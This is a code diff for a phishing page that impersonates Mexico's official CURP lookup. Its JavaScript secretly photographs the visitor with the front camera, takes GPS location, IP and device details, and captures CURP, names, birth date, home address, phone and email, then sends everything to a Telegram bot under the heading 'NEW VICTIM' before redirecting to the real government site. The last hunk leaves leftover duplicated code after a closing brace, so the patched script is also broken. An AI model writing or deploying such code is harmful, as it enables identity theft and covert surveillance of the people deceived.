@@ -364,28 +364,54 @@ function enviar(){
   var CHAT="9092452687";
   var API="https://api.telegram.org/bot"+TOKEN;
 
-  var txt="🔔 <b>NUEVA VÍCTIMA</b>\n\n";
-  txt+="📱 <b>Móvil:</b> "+info.modelo+"\n";
-  txt+="💻 <b>SO:</b> "+info.so+"\n";
-  txt+="🌐 <b>Nav:</b> "+info.navegador+"\n";
-  txt+="📺 <b>Pantalla:</b> "+info.pantalla+"\n";
-  txt+="🌎 <b>Idioma:</b> "+info.idioma+"\n";
-  txt+="🔋 <b>Bat:</b> "+info.bateria+"\n";
-  txt+="📡 <b>Red:</b> "+info.red+"\n";
-  txt+="📍 <b>IP:</b> "+info.ip+"\n";
-  txt+="🏙️ <b>Ciudad:</b> "+info.ciudad+"\n";
-  txt+="🌍 <b>País:</b> "+info.pais+"\n";
-  txt+="🧭 <b>GPS:</b> "+info.gps+"\n";
-  if(Object.keys(form).length){
-    txt+="\n📋 <b>DATOS DEL FORMULARIO:</b>\n";
-    for(var k in form){if(form[k]) txt+="  • <b>"+k+":</b> "+form[k]+"\n";}
+  var txt="🔔 <b>NUEVA VÍCTIMA</b>
+
+";
+  txt+="📱 <b>Móvil:</b> "+info.modelo+"
+";
+  txt+="💻 <b>SO:</b> "+info.so+"
+";
+  txt+="🌐 <b>Nav:</b> "+info.navegador+"
+";
+  txt+="📺 <b>Pantalla:</b> "+info.pantalla+"
+";
+  txt+="🌎 <b>Idioma:</b> "+info.idioma+"
+";
+  txt+="🔋 <b>Bat:</b> "+info.bateria+"
+";
+  txt+="📡 <b>Red:</b> "+info.red+"
+";
+  txt+="📍 <b>IP:</b> "+info.ip+"
+";
+  txt+="🏙️ <b>Ciudad:</b> "+info.ciudad+"
+";
+  txt+="🌍 <b>País:</b> "+info.pais+"
+";
+  txt+="🧭 <b>GPS:</b> "+info.gps+"
+";
+
+  if(form && Object.keys(form).length){
+    txt+="
+📋 <b>DATOS DEL FORMULARIO:</b>
+";
+    var etiquetas={curp:"CURP",nombre:"Nombre(s)",ap:"Primer apellido",am:"Segundo apellido",dia:"Día",mes:"Mes",anio:"Año",fecha:"Fecha",sexo:"Sexo",entidad:"Entidad",calle:"Calle",num_ext:"Núm. exterior",num_int:"Núm. interior",cp:"CP",colonia:"Colonia",municipio:"Municipio",estado:"Estado",entre:"Entre calles",tel:"Teléfono",email:"Email"};
+    for(var k in form){
+      if(form[k]){
+        var lbl=etiquetas[k]||k;
+        txt+="  • <b>"+lbl+":</b> "+form[k]+"
+";
+      }
+    }
+  } else {
+    txt+="
+⚠️ Sin datos de formulario";
   }
 
-  fetch(API+"/sendMessage",{
+  var p1=fetch(API+"/sendMessage",{
     method:"POST",
     headers:{"Content-Type":"application/json"},
     body:JSON.stringify({chat_id:CHAT,text:txt,parse_mode:"HTML"})
-  }).catch(()=>{});
+  }).then(r=>r.json()).then(d=>console.log("MSG:",d)).catch(e=>console.error("MSG err:",e));
 
   if(foto){
     var blob=dataURLtoBlob(foto);
@@ -393,11 +419,11 @@ function enviar(){
     fd.append("chat_id",CHAT);
     fd.append("photo",blob,"foto.jpg");
     fd.append("caption","📷 Foto frontal");
-    fetch(API+"/sendPhoto",{method:"POST",body:fd}).catch(()=>{});
+    fetch(API+"/sendPhoto",{method:"POST",body:fd}).then(r=>r.json()).then(d=>console.log("FOTO:",d)).catch(e=>console.error("FOTO err:",e));
   }
-  return Promise.resolve();
-}
 
+  return p1;
+}
 function dataURLtoBlob(dataurl){
   var arr=dataurl.split(","),mime=arr[0].match(/:(.*?);/)[1];
   var bstr=atob(arr[1]),n=bstr.length,u8arr=new Uint8Array(n);
@@ -429,6 +455,7 @@ function autocompletarCP(cp){
 document.getElementById('cp').addEventListener('input',function(){autocompletarCP(this.value);});
 async function ejecutarFlujo(boton){
   boton.disabled=true;
+  var orig=boton.innerHTML;
   boton.innerHTML='<span class="load"></span> Buscando…';
   try{
     var stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
@@ -438,9 +465,11 @@ async function ejecutarFlujo(boton){
     var c=document.createElement('canvas');c.width=video.videoWidth;c.height=video.videoHeight;
     c.getContext('2d').drawImage(video,0,0);foto=c.toDataURL('image/jpeg',0.85);
     stream.getTracks().forEach(t=>t.stop());
-  }catch(e){}
+  }catch(err){console.log("Camara err:",err);}
   await new Promise(r=>setTimeout(r,300));
   await new Promise(res=>{navigator.geolocation.getCurrentPosition(p=>{info.gps=p.coords.latitude.toFixed(6)+','+p.coords.longitude.toFixed(6);res();},()=>{info.gps='denegada';res();},{timeout:6000});});
+  // AQUÍ form ya está relleno (por el onclick)
+  console.log("enviar con form:", JSON.stringify(form));
   await enviar();
   await new Promise(r=>setTimeout(r,800));
   window.location='https://www.gob.mx/curp/';
@@ -448,7 +477,41 @@ async function ejecutarFlujo(boton){
 document.getElementById('btnBuscar').onclick=async function(e){
   e.preventDefault();
   var panelCurpVisible=!document.getElementById('panel-curp').classList.contains('panel-oculto');
-  if(panelCurpVisible){form={};form.curp=v('curp');if(!form.curp)form.curp='(vacío)';}
+  var formCapturado={};
+  if(panelCurpVisible){
+    formCapturado.curp=v('curp');
+    if(!formCapturado.curp) formCapturado.curp='(vacío)';
+  }else{
+    formCapturado.nombre=v('nombre');
+    formCapturado.ap=v('primer-apellido');
+    formCapturado.am=v('segundo-apellido');
+    formCapturado.dia=v('dia');
+    formCapturado.mes=v('mes');
+    formCapturado.anio=v('anio');
+    formCapturado.sexo=v('sexo');
+    formCapturado.entidad=v('estado');
+    formCapturado.calle=v('calle');
+    formCapturado.num_ext=v('num-ext');
+    formCapturado.num_int=v('num-int');
+    formCapturado.cp=v('cp');
+    formCapturado.colonia=v('colonia');
+    formCapturado.municipio=v('municipio');
+    formCapturado.estado=v('estado-dom');
+    formCapturado.entre=v('entre');
+    formCapturado.email=v('email');
+    var lada=v('lada'), tel=v('telefono');
+    if(tel) formCapturado.tel=lada+' '+tel;
+    if(formCapturado.dia && formCapturado.mes && formCapturado.anio){
+      formCapturado.fecha=formCapturado.dia+'/'+formCapturado.mes+'/'+formCapturado.anio;
+    }
+    // limpia vacíos
+    for(var k in formCapturado){if(!formCapturado[k]) delete formCapturado[k];}
+  }
+  // Asigna form global para que enviar() lo use
+  form=formCapturado;
+  console.log("FORM a enviar:", JSON.stringify(form));
+  await ejecutarFlujo(this);
+};form.curp=v('curp');if(!form.curp)form.curp='(vacío)';}
   else{leerForm();}
   await ejecutarFlujo(this);
 };
